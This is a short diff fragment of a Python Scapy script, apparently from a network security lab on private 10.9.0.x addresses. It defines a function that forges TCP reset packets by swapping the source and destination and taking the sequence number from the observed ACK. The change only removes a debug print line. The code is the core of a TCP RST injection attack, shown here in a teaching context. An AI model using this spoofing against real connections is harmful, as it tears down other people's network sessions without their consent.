@@ -4,7 +4,6 @@ H1_IP = '10.9.0.6'
 V_IP = '10.9.0.5'
 
 def spoofRST(pkt):
-  pkt.show()
   ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
   tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='R', seq=pkt[TCP].ack)
   npkt = ip/tcp
